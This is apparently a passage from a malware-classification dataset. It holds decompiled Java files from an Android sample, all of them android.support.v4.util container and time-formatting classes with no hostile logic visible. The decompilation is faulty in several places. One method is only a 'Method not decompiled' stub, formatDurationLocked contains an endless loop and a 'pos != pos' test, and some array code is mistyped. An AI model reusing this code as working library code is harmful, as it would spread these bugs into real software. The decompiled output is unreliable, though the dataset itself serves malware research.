this.mEntryValid=true;       return this;     }     @Override public void remove(){       if (!this.mEntryValid) {         throw new IllegalStateException();       }       this.mIndex--;       this.mEnd--;       this.mEntryValid=false;       MapCollections.this.colRemoveAt(this.mIndex);     }     @Override public K getKey(){       if (!this.mEntryValid) {         throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");       }       return (K)MapCollections.this.colGetEntry(this.mIndex,0);     }     @Override public V getValue(){       if (!this.mEntryValid) {         throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");       }       return (V)MapCollections.this.colGetEntry(this.mIndex,1);     }     @Override public V setValue(    V v){       if (!this.mEntryValid) {         throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");       }       return (V)MapCollections.this.colSetValue(this.mIndex,v);     }     @Override public final boolean equals(    Object o){       if (!this.mEntryValid) {         throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");       }       if (!(o instanceof Map.Entry)) {         return false;       }       Map.Entry<?,?> e=(Map.Entry)o;       return ContainerHelpers.equal(e.getKey(),MapCollections.this.colGetEntry(this.mIndex,0)) && ContainerHelpers.equal(e.getValue(),MapCollections.this.colGetEntry(this.mIndex,1));     }     @Override public final int hashCode(){       if (!this.mEntryValid) {         throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");       }       Object key=MapCollections.this.colGetEntry(this.mIndex,0);       Object value=MapCollections.this.colGetEntry(this.mIndex,1);       return (value != null ? value.hashCode() : 0) ^ (key == null ? 0 : key.hashCode());     }     public final String toString(){       return getKey() + ""="" + getValue();     }   } final class EntrySet implements Set<Map.Entry<K,V>> {     EntrySet(){     }     @Override public boolean add(    Map.Entry<K,V> object){       throw new UnsupportedOperationException();     }     @Override public boolean addAll(    Collection<? extends Map.Entry<K,V>> collection){       int oldSize=MapCollections.this.colGetSize();       for (      Map.Entry<K,V> entry : collection) {         MapCollections.this.colPut(entry.getKey(),entry.getValue());       }       return oldSize != MapCollections.this.colGetSize();     }     @Override public void clear(){       MapCollections.this.colClear();     }     @Override public boolean contains(    Object o){       if (!(o instanceof Map.Entry)) {         return false;       }       Map.Entry<?,?> e=(Map.Entry)o;       int index=MapCollections.this.colIndexOfKey(e.getKey());       if (index < 0) {         return false;       }       Object foundVal=MapCollections.this.colGetEntry(index,1);       return ContainerHelpers.equal(foundVal,e.getValue());     }     @Override public boolean containsAll(    Collection<?> collection){       Iterator<?> it=collection.iterator();       while (it.hasNext()) {         if (!contains(it.next())) {           return false;         }       }       return true;     }     @Override public boolean isEmpty(){       return MapCollections.this.colGetSize() == 0;     }     @Override public Iterator<Map.Entry<K,V>> iterator(){       return new MapIterator();     }     @Override public boolean remove(    Object object){       throw new UnsupportedOperationException();     }     @Override public boolean removeAll(    Collection<?> collection){       throw new UnsupportedOperationException();     }     @Override public boolean retainAll(    Collection<?> collection){       throw new UnsupportedOperationException();     }     @Override public int size(){       return MapCollections.this.colGetSize();     }     @Override public Object[] toArray(){       throw new UnsupportedOperationException();     }     @Override public <T>T[] toArray(    T[] array){       throw new UnsupportedOperationException();     }     @Override public boolean equals(    Object object){       return MapCollections.equalsSetHelper(this,object);     }     @Override public int hashCode(){       int result=0;       for (int i=MapCollections.this.colGetSize() - 1; i >= 0; i--) {         Object key=MapCollections.this.colGetEntry(i,0);         Object value=MapCollections.this.colGetEntry(i,1);         result+=(value == null ? 0 : value.hashCode()) ^ (key == null ? 0 : key.hashCode());       }       return result;     }   } final class KeySet implements Set<K> {     KeySet(){     }     @Override public boolean add(    K object){       throw new UnsupportedOperationException();     }     @Override public boolean addAll(    Collection<? extends K> collection){       throw new UnsupportedOperationException();     }     @Override public void clear(){       MapCollections.this.colClear();     }     @Override public boolean contains(    Object object){       return MapCollections.this.colIndexOfKey(object) >= 0;     }     @Override public boolean containsAll(    Collection<?> collection){       return MapCollections.containsAllHelper(MapCollections.this.colGetMap(),collection);     }     @Override public boolean isEmpty(){       return MapCollections.this.colGetSize() == 0;     }     @Override public Iterator<K> iterator(){       return new ArrayIterator(0);     }     @Override public boolean remove(    Object object){       int index=MapCollections.this.colIndexOfKey(object);       if (index < 0) {         return false;       }       MapCollections.this.colRemoveAt(index);       return true;     }     @Override public boolean removeAll(    Collection<?> collection){       return MapCollections.removeAllHelper(MapCollections.this.colGetMap(),collection);     }     @Override public boolean retainAll(    Collection<?> collection){       return MapCollections.retainAllHelper(MapCollections.this.colGetMap(),collection);     }     @Override public int size(){       return MapCollections.this.colGetSize();     }     @Override public Object[] toArray(){       return MapCollections.this.toArrayHelper(0);     }     @Override public <T>T[] toArray(    T[] tArr){       return (T[])MapCollections.this.toArrayHelper(tArr,0);     }     @Override public boolean equals(    Object object){       return MapCollections.equalsSetHelper(this,object);     }     @Override public int hashCode(){       int result=0;       for (int i=MapCollections.this.colGetSize() - 1; i >= 0; i--) {         Object obj=MapCollections.this.colGetEntry(i,0);         result+=obj == null ? 0 : obj.hashCode();       }       return result;     }   } final class ValuesCollection implements Collection<V> {     ValuesCollection(){     }     @Override public boolean add(    V object){       throw new UnsupportedOperationException();     }     @Override public boolean addAll(    Collection<? extends V> collection){       throw new UnsupportedOperationException();     }     @Override public void clear(){       MapCollections.this.colClear();     }     @Override public boolean contains(    Object object){       return MapCollections.this.colIndexOfValue(object) >= 0;     }     @Override public boolean containsAll(    Collection<?> collection){       Iterator<?> it=collection.iterator();       while (it.hasNext()) {         if (!contains(it.next())) {           return false;         }       }       return true;     }     @Override public boolean isEmpty(){       return MapCollections.this.colGetSize() == 0;     }     @Override public Iterator<V> iterator(){       return new ArrayIterator(1);     }     @Override public boolean remove(    Object object){       int index=MapCollections.this.colIndexOfValue(object);       if (index < 0) {         return false;       }       MapCollections.this.colRemoveAt(index);       return true;     }     @Override public boolean removeAll(    Collection<?> collection){       int N=MapCollections.this.colGetSize();       boolean changed=false;       int i=0;       while (i < N) {         Object cur=MapCollections.this.colGetEntry(i,1);         if (collection.contains(cur)) {           MapCollections.this.colRemoveAt(i);           i--;           N--;           changed=true;         }         i++;       }       return changed;     }     @Override public boolean retainAll(    Collection<?> collection){       int N=MapCollections.this.colGetSize();       boolean changed=false;       int i=0;       while (i < N) {         Object cur=MapCollections.this.colGetEntry(i,1);         if (!collection.contains(cur)) {           MapCollections.this.colRemoveAt(i);           i--;           N--;           changed=true;         }         i++;       }       return changed;     }     @Override public int size(){       return MapCollections.this.colGetSize();     }     @Override public Object[] toArray(){       return MapCollections.this.toArrayHelper(1);     }     @Override public <T>T[] toArray(    T[] tArr){       return (T[])MapCollections.this.toArrayHelper(tArr,1);     }   }   public static <K,V>boolean containsAllHelper(  Map<K,V> map,  Collection<?> collection){     Iterator<?> it=collection.iterator();     while (it.hasNext()) {       if (!map.containsKey(it.next())) {         return false;       }     }     return true;   }   public static <K,V>boolean removeAllHelper(  Map<K,V> map,  Collection<?> collection){     int oldSize=map.size();     Iterator<?> it=collection.iterator();     while (it.hasNext()) {       map.remove(it.next());     }     return oldSize != map.size();   }   public static <K,V>boolean retainAllHelper(  Map<K,V> map,  Collection<?> collection){     int oldSize=map.size();     Iterator<K> it=map.keySet().iterator();     while (it.hasNext()) {       if (!collection.contains(it.next())) {         it.remove();       }     }     return oldSize != map.size();   }   public Object[] toArrayHelper(  int offset){     int N=colGetSize();     Object[] result=new Object[N];     for (int i=0; i < N; i++) {       result[i]=colGetEntry(i,offset);     }     return result;   }   public <T>T[] toArrayHelper(  T[] tArr,  int i){     int colGetSize=colGetSize();     if (tArr.length < colGetSize) {       tArr=(Object[])Array.newInstance(tArr.getClass().getComponentType(),colGetSize);     }     for (int i2=0; i2 < colGetSize; i2++) {       tArr[i2]=colGetEntry(i2,i);     }     if (tArr.length > colGetSize) {       tArr[colGetSize]=0;     }     return tArr;   }   public static <T>boolean equalsSetHelper(  java.util.Set<T> r6,  java.lang.Object r7){     throw new UnsupportedOperationException(""Method not decompiled: android.support.v4.util.MapCollections.equalsSetHelper(java.util.Set, java.lang.Object):boolean"");   }   public Set<Map.Entry<K,V>> getEntrySet(){     if (this.mEntrySet == null) {       this.mEntrySet=new EntrySet();     }     return this.mEntrySet;   }   public Set<K> getKeySet(){     if (this.mKeySet == null) {       this.mKeySet=new KeySet();     }     return this.mKeySet;   }   public Collection<V> getValues(){     if (this.mValues == null) {       this.mValues=new ValuesCollection();     }     return this.mValues;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.util\MapIterator.code","final class MapIterator implements Iterator<Map.Entry<K,V>>, Map.Entry<K,V> {   int mEnd;   boolean mEntryValid=false;   int mIndex=-1;   MapIterator(){     this.mEnd=MapCollections.this.colGetSize() - 1;   }   @Override public boolean hasNext(){     return this.mIndex < this.mEnd;   }   @Override public Map.Entry<K,V> next(){     this.mIndex++;     this.mEntryValid=true;     return this;   }   @Override public void remove(){     if (!this.mEntryValid) {       throw new IllegalStateException();     }     this.mIndex--;     this.mEnd--;     this.mEntryValid=false;     MapCollections.this.colRemoveAt(this.mIndex);   }   @Override public K getKey(){     if (!this.mEntryValid) {       throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");     }     return (K)MapCollections.this.colGetEntry(this.mIndex,0);   }   @Override public V getValue(){     if (!this.mEntryValid) {       throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");     }     return (V)MapCollections.this.colGetEntry(this.mIndex,1);   }   @Override public V setValue(  V v){     if (!this.mEntryValid) {       throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");     }     return (V)MapCollections.this.colSetValue(this.mIndex,v);   }   @Override public final boolean equals(  Object o){     if (!this.mEntryValid) {       throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");     }     if (!(o instanceof Map.Entry)) {       return false;     }     Map.Entry<?,?> e=(Map.Entry)o;     return ContainerHelpers.equal(e.getKey(),MapCollections.this.colGetEntry(this.mIndex,0)) && ContainerHelpers.equal(e.getValue(),MapCollections.this.colGetEntry(this.mIndex,1));   }   @Override public final int hashCode(){     if (!this.mEntryValid) {       throw new IllegalStateException(""This container does not support retaining Map.Entry objects"");     }     Object key=MapCollections.this.colGetEntry(this.mIndex,0);     Object value=MapCollections.this.colGetEntry(this.mIndex,1);     return (value != null ? value.hashCode() : 0) ^ (key == null ? 0 : key.hashCode());   }   public final String toString(){     return getKey() + ""="" + getValue();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.util\SimpleArrayMap.code","public class SimpleArrayMap<K,V> {   private static final int BASE_SIZE=4;   private static final int CACHE_SIZE=10;   private static final boolean DEBUG=false;   private static final String TAG=""ArrayMap"";   static Object[] mBaseCache;   static int mBaseCacheSize;   static Object[] mTwiceBaseCache;   static int mTwiceBaseCacheSize;   Object[] mArray;   int[] mHashes;   int mSize;   public int indexOf(  Object key,  int hash){     int N=this.mSize;     if (N == 0) {       return -1;     }     int index=ContainerHelpers.binarySearch(this.mHashes,N,hash);     if (index >= 0 && !key.equals(this.mArray[index << 1])) {       int end=index + 1;       while (end < N && this.mHashes[end] == hash) {         if (key.equals(this.mArray[end << 1])) {           return end;         }         end++;       }       for (int i=index - 1; i >= 0 && this.mHashes[i] == hash; i--) {         if (key.equals(this.mArray[i << 1])) {           return i;         }       }       return end ^ (-1);     }     return index;   }   public int indexOfNull(){     int N=this.mSize;     if (N == 0) {       return -1;     }     int index=ContainerHelpers.binarySearch(this.mHashes,N,0);     if (index >= 0 && this.mArray[index << 1] != null) {       int end=index + 1;       while (end < N && this.mHashes[end] == 0) {         if (this.mArray[end << 1] == null) {           return end;         }         end++;       }       for (int i=index - 1; i >= 0 && this.mHashes[i] == 0; i--) {         if (this.mArray[i << 1] == null) {           return i;         }       }       return end ^ (-1);     }     return index;   }   private void allocArrays(  int size){     if (size == 8) { synchronized (ArrayMap.class) {         if (mTwiceBaseCache != null) {           Object[] array=mTwiceBaseCache;           this.mArray=array;           mTwiceBaseCache=(Object[])array[0];           this.mHashes=(int[])array[1];           array[1]=null;           array[0]=null;           mTwiceBaseCacheSize--;           return;         }       }     }  else     if (size == 4) { synchronized (ArrayMap.class) {         if (mBaseCache != null) {           Object[] array2=mBaseCache;           this.mArray=array2;           mBaseCache=(Object[])array2[0];           this.mHashes=(int[])array2[1];           array2[1]=null;           array2[0]=null;           mBaseCacheSize--;           return;         }       }     }     this.mHashes=new int[size];     this.mArray=new Object[size << 1];   }   private static void freeArrays(  int[] hashes,  Object[] array,  int size){     if (hashes.length == 8) { synchronized (ArrayMap.class) {         if (mTwiceBaseCacheSize < 10) {           array[0]=mTwiceBaseCache;           array[1]=hashes;           for (int i=(size << 1) - 1; i >= 2; i--) {             array[i]=null;           }           mTwiceBaseCache=array;           mTwiceBaseCacheSize++;         }       }       return;     }     if (hashes.length == 4) { synchronized (ArrayMap.class) {         if (mBaseCacheSize < 10) {           array[0]=mBaseCache;           array[1]=hashes;           for (int i2=(size << 1) - 1; i2 >= 2; i2--) {             array[i2]=null;           }           mBaseCache=array;           mBaseCacheSize++;         }       }     }   }   public SimpleArrayMap(){     this.mHashes=ContainerHelpers.EMPTY_INTS;     this.mArray=ContainerHelpers.EMPTY_OBJECTS;     this.mSize=0;   }   public SimpleArrayMap(  int capacity){     if (capacity == 0) {       this.mHashes=ContainerHelpers.EMPTY_INTS;       this.mArray=ContainerHelpers.EMPTY_OBJECTS;     }  else {       allocArrays(capacity);     }     this.mSize=0;   }   public SimpleArrayMap(  SimpleArrayMap map){     this();     if (map != null) {       putAll(map);     }   }   public void clear(){     if (this.mSize != 0) {       freeArrays(this.mHashes,this.mArray,this.mSize);       this.mHashes=ContainerHelpers.EMPTY_INTS;       this.mArray=ContainerHelpers.EMPTY_OBJECTS;       this.mSize=0;     }   }   public void ensureCapacity(  int minimumCapacity){     if (this.mHashes.length < minimumCapacity) {       int[] ohashes=this.mHashes;       Object[] oarray=this.mArray;       allocArrays(minimumCapacity);       if (this.mSize > 0) {         System.arraycopy(ohashes,0,this.mHashes,0,this.mSize);         System.arraycopy(oarray,0,this.mArray,0,this.mSize << 1);       }       freeArrays(ohashes,oarray,this.mSize);     }   }   public boolean containsKey(  Object key){     if (key == null) {       if (indexOfNull() >= 0) {         return true;       }       return DEBUG;     }     if (indexOf(key,key.hashCode()) < 0) {       return DEBUG;     }     return true;   }   public int indexOfValue(  Object value){     int N=this.mSize * 2;     Object[] array=this.mArray;     if (value == null) {       for (int i=1; i < N; i+=2) {         if (array[i] == null) {           return i >> 1;         }       }     }  else {       for (int i2=1; i2 < N; i2+=2) {         if (value.equals(array[i2])) {           return i2 >> 1;         }       }     }     return -1;   }   public boolean containsValue(  Object value){     if (indexOfValue(value) >= 0) {       return true;     }     return DEBUG;   }   public V get(  Object obj){     int indexOfNull=obj == null ? indexOfNull() : indexOf(obj,obj.hashCode());     if (indexOfNull >= 0) {       return (V)this.mArray[(indexOfNull << 1) + 1];     }     return null;   }   public K keyAt(  int i){     return (K)this.mArray[i << 1];   }   public V valueAt(  int i){     return (V)this.mArray[(i << 1) + 1];   }   public V setValueAt(  int i,  V v){     int i2=(i << 1) + 1;     V v2=(V)this.mArray[i2];     this.mArray[i2]=v;     return v2;   }   public boolean isEmpty(){     if (this.mSize <= 0) {       return true;     }     return DEBUG;   }   public V put(  K k,  V v){     int hashCode;     int indexOf;     int i=8;     if (k == null) {       hashCode=0;       indexOf=indexOfNull();     }  else {       hashCode=k.hashCode();       indexOf=indexOf(k,hashCode);     }     if (indexOf >= 0) {       int i2=(indexOf << 1) + 1;       V v2=(V)this.mArray[i2];       this.mArray[i2]=v;       return v2;     }     int i3=indexOf ^ (-1);     if (this.mSize >= this.mHashes.length) {       if (this.mSize >= 8) {         i=this.mSize + (this.mSize >> 1);       }  else       if (this.mSize < 4) {         i=4;       }       int[] iArr=this.mHashes;       Object[] objArr=this.mArray;       allocArrays(i);       if (this.mHashes.length > 0) {         System.arraycopy(iArr,0,this.mHashes,0,iArr.length);         System.arraycopy(objArr,0,this.mArray,0,objArr.length);       }       freeArrays(iArr,objArr,this.mSize);     }     if (i3 < this.mSize) {       System.arraycopy(this.mHashes,i3,this.mHashes,i3 + 1,this.mSize - i3);       System.arraycopy(this.mArray,i3 << 1,this.mArray,(i3 + 1) << 1,(this.mSize - i3) << 1);     }     this.mHashes[i3]=hashCode;     this.mArray[i3 << 1]=k;     this.mArray[(i3 << 1) + 1]=v;     this.mSize++;     return null;   }   public void putAll(  SimpleArrayMap<? extends K,? extends V> array){     int N=array.mSize;     ensureCapacity(this.mSize + N);     if (this.mSize == 0) {       if (N > 0) {         System.arraycopy(array.mHashes,0,this.mHashes,0,N);         System.arraycopy(array.mArray,0,this.mArray,0,N << 1);         this.mSize=N;         return;       }       return;     }     for (int i=0; i < N; i++) {       put(array.keyAt(i),array.valueAt(i));     }   }   public V remove(  Object key){     int index=key == null ? indexOfNull() : indexOf(key,key.hashCode());     if (index >= 0) {       return removeAt(index);     }     return null;   }   public V removeAt(  int i){     V v=(V)this.mArray[(i << 1) + 1];     if (this.mSize <= 1) {       freeArrays(this.mHashes,this.mArray,this.mSize);       this.mHashes=ContainerHelpers.EMPTY_INTS;       this.mArray=ContainerHelpers.EMPTY_OBJECTS;       this.mSize=0;     }  else     if (this.mHashes.length > 8 && this.mSize < this.mHashes.length / 3) {       int i2=this.mSize > 8 ? this.mSize + (this.mSize >> 1) : 8;       int[] iArr=this.mHashes;       Object[] objArr=this.mArray;       allocArrays(i2);       this.mSize--;       if (i > 0) {         System.arraycopy(iArr,0,this.mHashes,0,i);         System.arraycopy(objArr,0,this.mArray,0,i << 1);       }       if (i < this.mSize) {         System.arraycopy(iArr,i + 1,this.mHashes,i,this.mSize - i);         System.arraycopy(objArr,(i + 1) << 1,this.mArray,i << 1,(this.mSize - i) << 1);       }     }  else {       this.mSize--;       if (i < this.mSize) {         System.arraycopy(this.mHashes,i + 1,this.mHashes,i,this.mSize - i);         System.arraycopy(this.mArray,(i + 1) << 1,this.mArray,i << 1,(this.mSize - i) << 1);       }       this.mArray[this.mSize << 1]=null;       this.mArray[(this.mSize << 1) + 1]=null;     }     return v;   }   public int size(){     return this.mSize;   }   public boolean equals(  Object object){     if (this == object) {       return true;     }     if (!(object instanceof Map)) {       return DEBUG;     }     Map<?,?> map=(Map)object;     if (size() != map.size()) {       return DEBUG;     }     for (int i=0; i < this.mSize; i++) {       try {         K key=keyAt(i);         V mine=valueAt(i);         Object theirs=map.get(key);         if (mine == null) {           if (theirs != null || !map.containsKey(key)) {             return DEBUG;           }         }  else         if (!mine.equals(theirs)) {           return DEBUG;         }       }  catch (      ClassCastException e) {         return DEBUG;       } catch (      NullPointerException e2) {         return DEBUG;       }     }     return true;   }   public int hashCode(){     int[] hashes=this.mHashes;     Object[] array=this.mArray;     int result=0;     int i=0;     int v=1;     int s=this.mSize;     while (i < s) {       Object value=array[v];       result+=(value == null ? 0 : value.hashCode()) ^ hashes[i];       i++;       v+=2;     }     return result;   }   public String toString(){     if (isEmpty()) {       return ""{}"";     }     StringBuilder buffer=new StringBuilder(this.mSize * 28);     buffer.append('{');     for (int i=0; i < this.mSize; i++) {       if (i > 0) {         buffer.append("", "");       }       Object key=keyAt(i);       if (key != this) {         buffer.append(key);       }  else {         buffer.append(""(this Map)"");       }       buffer.append('=');       Object value=valueAt(i);       if (value != this) {         buffer.append(value);       }  else {         buffer.append(""(this Map)"");       }     }     buffer.append('}');     return buffer.toString();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.util\SparseArrayCompat.code","public class SparseArrayCompat<E> implements Cloneable {   private static final Object DELETED=new Object();   private boolean mGarbage;   private int[] mKeys;   private int mSize;   private Object[] mValues;   public SparseArrayCompat(){     this(10);   }   public SparseArrayCompat(  int initialCapacity){     this.mGarbage=false;     if (initialCapacity == 0) {       this.mKeys=ContainerHelpers.EMPTY_INTS;       this.mValues=ContainerHelpers.EMPTY_OBJECTS;     }  else {       int initialCapacity2=ContainerHelpers.idealIntArraySize(initialCapacity);       this.mKeys=new int[initialCapacity2];       this.mValues=new Object[initialCapacity2];     }     this.mSize=0;   }   public SparseArrayCompat<E> m1clone(){     SparseArrayCompat<E> clone=null;     try {       clone=(SparseArrayCompat)super.clone();       clone.mKeys=(int[])this.mKeys.clone();       clone.mValues=(Object[])this.mValues.clone();       return clone;     }  catch (    CloneNotSupportedException e) {       return clone;     }   }   public E get(  int key){     return get(key,null);   }   public E get(  int i,  E e){     int binarySearch=ContainerHelpers.binarySearch(this.mKeys,this.mSize,i);     return (binarySearch < 0 || this.mValues[binarySearch] == DELETED) ? e : (E)this.mValues[binarySearch];   }   public void delete(  int key){     int i=ContainerHelpers.binarySearch(this.mKeys,this.mSize,key);     if (i >= 0 && this.mValues[i] != DELETED) {       this.mValues[i]=DELETED;       this.mGarbage=true;     }   }   public void remove(  int key){     delete(key);   }   public void removeAt(  int index){     if (this.mValues[index] != DELETED) {       this.mValues[index]=DELETED;       this.mGarbage=true;     }   }   public void removeAtRange(  int index,  int size){     int end=Math.min(this.mSize,index + size);     for (int i=index; i < end; i++) {       removeAt(i);     }   }   private void gc(){     int n=this.mSize;     int o=0;     int[] keys=this.mKeys;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       Object val=values[i];       if (val != DELETED) {         if (i != o) {           keys[o]=keys[i];           values[o]=val;           values[i]=null;         }         o++;       }     }     this.mGarbage=false;     this.mSize=o;   }   public void put(  int key,  E value){     int i=ContainerHelpers.binarySearch(this.mKeys,this.mSize,key);     if (i >= 0) {       this.mValues[i]=value;       return;     }     int i2=i ^ (-1);     if (i2 < this.mSize && this.mValues[i2] == DELETED) {       this.mKeys[i2]=key;       this.mValues[i2]=value;       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();       i2=ContainerHelpers.binarySearch(this.mKeys,this.mSize,key) ^ (-1);     }     if (this.mSize >= this.mKeys.length) {       int n=ContainerHelpers.idealIntArraySize(this.mSize + 1);       int[] nkeys=new int[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     if (this.mSize - i2 != 0) {       System.arraycopy(this.mKeys,i2,this.mKeys,i2 + 1,this.mSize - i2);       System.arraycopy(this.mValues,i2,this.mValues,i2 + 1,this.mSize - i2);     }     this.mKeys[i2]=key;     this.mValues[i2]=value;     this.mSize++;   }   public int size(){     if (this.mGarbage) {       gc();     }     return this.mSize;   }   public int keyAt(  int index){     if (this.mGarbage) {       gc();     }     return this.mKeys[index];   }   public E valueAt(  int i){     if (this.mGarbage) {       gc();     }     return (E)this.mValues[i];   }   public void setValueAt(  int index,  E value){     if (this.mGarbage) {       gc();     }     this.mValues[index]=value;   }   public int indexOfKey(  int key){     if (this.mGarbage) {       gc();     }     return ContainerHelpers.binarySearch(this.mKeys,this.mSize,key);   }   public int indexOfValue(  E value){     if (this.mGarbage) {       gc();     }     for (int i=0; i < this.mSize; i++) {       if (this.mValues[i] == value) {         return i;       }     }     return -1;   }   public void clear(){     int n=this.mSize;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       values[i]=null;     }     this.mSize=0;     this.mGarbage=false;   }   public void append(  int key,  E value){     if (this.mSize != 0 && key <= this.mKeys[this.mSize - 1]) {       put(key,value);       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();     }     int pos=this.mSize;     if (pos >= this.mKeys.length) {       int n=ContainerHelpers.idealIntArraySize(pos + 1);       int[] nkeys=new int[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     this.mKeys[pos]=key;     this.mValues[pos]=value;     this.mSize=pos + 1;   }   public String toString(){     if (size() <= 0) {       return ""{}"";     }     StringBuilder buffer=new StringBuilder(this.mSize * 28);     buffer.append('{');     for (int i=0; i < this.mSize; i++) {       if (i > 0) {         buffer.append("", "");       }       int key=keyAt(i);       buffer.append(key);       buffer.append('=');       Object value=valueAt(i);       if (value != this) {         buffer.append(value);       }  else {         buffer.append(""(this Map)"");       }     }     buffer.append('}');     return buffer.toString();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.util\TimeUtils.code","public class TimeUtils {   public static final int HUNDRED_DAY_FIELD_LEN=19;   private static final int SECONDS_PER_DAY=86400;   private static final int SECONDS_PER_HOUR=3600;   private static final int SECONDS_PER_MINUTE=60;   private static final Object sFormatSync=new Object();   private static char[] sFormatStr=new char[24];   private static int accumField(  int amt,  int suffix,  boolean always,  int zeropad){     if (amt > 99 || (always && zeropad >= 3)) {       return suffix + 3;     }     if (amt > 9 || (always && zeropad >= 2)) {       return suffix + 2;     }     if (always || amt > 0) {       return suffix + 1;     }     return 0;   }   private static int printField(  char[] formatStr,  int amt,  char suffix,  int pos,  boolean always,  int zeropad){     if (always || amt > 0) {       if ((always && zeropad >= 3) || amt > 99) {         int dig=amt / 100;         formatStr[pos]=(char)(dig + 48);         pos++;         amt-=dig * 100;       }       if ((always && zeropad >= 2) || amt > 9 || pos != pos) {         int dig2=amt / 10;         formatStr[pos]=(char)(dig2 + 48);         pos++;         amt-=dig2 * 10;       }       formatStr[pos]=(char)(amt + 48);       int pos2=pos + 1;       formatStr[pos2]=suffix;       return pos2 + 1;     }     return pos;   }   private static int formatDurationLocked(  long duration,  int fieldLen){     char prefix;     if (sFormatStr.length < fieldLen) {       sFormatStr=new char[fieldLen];     }     char[] formatStr=sFormatStr;     if (duration == 0) {       int fieldLen2=fieldLen - 1;       while (0 < fieldLen2) {         formatStr[0]=' ';       }       formatStr[0]='0';       return 1;     }     if (duration > 0) {       prefix='+';     }  else {       prefix='-';       duration=-duration;     }     int millis=(int)(duration % 1000);     int seconds=(int)Math.floor(duration / 1000);     int days=0;     int hours=0;     int minutes=0;     if (seconds > SECONDS_PER_DAY) {       days=seconds / SECONDS_PER_DAY;       seconds-=SECONDS_PER_DAY * days;     }     if (seconds > SECONDS_PER_HOUR) {       hours=seconds / SECONDS_PER_HOUR;       seconds-=hours * SECONDS_PER_HOUR;     }     if (seconds > SECONDS_PER_MINUTE) {       minutes=seconds / SECONDS_PER_MINUTE;       seconds-=minutes * SECONDS_PER_MINUTE;     }     int pos=0;     if (fieldLen != 0) {       int myLen=accumField(days,1,false,0);       int myLen2=myLen + accumField(hours,1,myLen > 0,2);       int myLen3=myLen2 + accumField(minutes,1,myLen2 > 0,2);       int myLen4=myLen3 + accumField(seconds,1,myLen3 > 0,2);       for (int myLen5=myLen4 + accumField(millis,2,true,myLen4 > 0 ? 3 : 0) + 1; myLen5 < fieldLen; myLen5++) {         formatStr[pos]=' ';         pos++;       }     }     formatStr[pos]=prefix;     int pos2=pos + 1;     boolean zeropad=fieldLen != 0;     int pos3=printField(formatStr,days,'d',pos2,false,0);     int pos4=printField(formatStr,hours,'h',pos3,pos3 != pos2,zeropad ? 2 : 0);     int pos5=printField(formatStr,minutes,'m',pos4,pos4 != pos2,zeropad ? 2 : 0);     int pos6=printField(formatStr,seconds,'s',pos5,pos5 != pos2,zeropad ? 2 : 0);     int pos7=printField(formatStr,millis,'m',pos6,true,(!zeropad || pos6 == pos2) ? 0 : 3);     formatStr[pos7]='s';     return pos7 + 1;   }   public static void formatDuration(  long duration,  StringBuilder builder){ synchronized (sFormatSync) {       int len=formatDurationLocked(duration,0);       builder.append(sFormatStr,0,len);     }   }   public static void formatDuration(  long duration,  PrintWriter pw,  int fieldLen){ synchronized (sFormatSync) {       int len=formatDurationLocked(duration,fieldLen);       pw.print(new String(sFormatStr,0,len));     }   }   public static void formatDuration(  long duration,  PrintWriter pw){     formatDuration(duration,pw,0);   }   public static void formatDuration(  long time,  long now,  PrintWriter pw){     if (time == 0) {       pw.print(""--"");     }  else {       formatDuration(time - now,pw,0);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.util\ValuesCollection.code","final class ValuesCollection implements Collection<V> {   ValuesCollection(){   }   @Override public boolean add(  V object){     throw new UnsupportedOperationException();   }   @Override public boolean addAll(  Collection<? extends V> collection){     throw new UnsupportedOperationException();   }   @Override public void clear(){     MapCollections.this.colClear();   }   @Override public boolean contains(  Object object){     return MapCollections.this.colIndexOfValue(object) >= 0;   }   @Override public boolean containsAll(  Collection<?> collection){     Iterator<?> it=collection.iterator();     while (it.hasNext()) {       if (!contains(it.next())) {         return false;       }     }     return true;   }   @Override public boolean isEmpty(){     return MapCollections.this.colGetSize() == 0;   }   @Override public Iterator<V> iterator(){     return new ArrayIterator(1);   }   @Override public boolean remove(  Object object){     int index=MapCollections.this.colIndexOfValue(object);     if (index < 0) {       return false;     }     MapCollections.this.colRemoveAt(index);     return true;   }   @Override public boolean removeAll(  Collection<?> collection){     int N=MapCollections.this.colGetSize();     boolean changed=false;     int i=0;     while (i < N) {       Object cur=MapCollections.this.colGetEntry(i,1);       if (collection.contains(cur)) {         MapCollections.this.colRemoveAt(i);         i--;         N--;         changed=true;       }       i++;     }     return changed;   }   @Override public boolean retainAll(  Collection<?> collection){     int N=MapCollections.this.colGetSize();     boolean changed=false;     int i=0;     while (i < N) {       Object cur=MapCollections.this.colGetEntry(i,1);       if (!collection.contains(cur)) {         MapCollections.this.colRemoveAt(i);         i--;         N--;         changed=true;       }       i++;     }     return changed;   }   @Override public int size(){     return 